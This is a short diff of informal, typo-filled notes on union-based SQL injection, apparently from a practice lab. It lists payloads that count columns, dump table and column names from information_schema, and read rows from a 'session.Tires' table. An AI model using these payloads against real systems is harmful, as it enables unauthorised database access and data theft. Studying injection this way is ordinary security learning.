@@ -34,3 +34,5 @@ find vulnerable, incriment by ine. Audi' union select 1,2,3,4,5; # (# means comm
 
                                 (2 is not there)        (5 colums)
 Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns; #
+look at session colum
+Audi' UNION SELECT tireid,2,name,size,cost FROM session.Tires;#
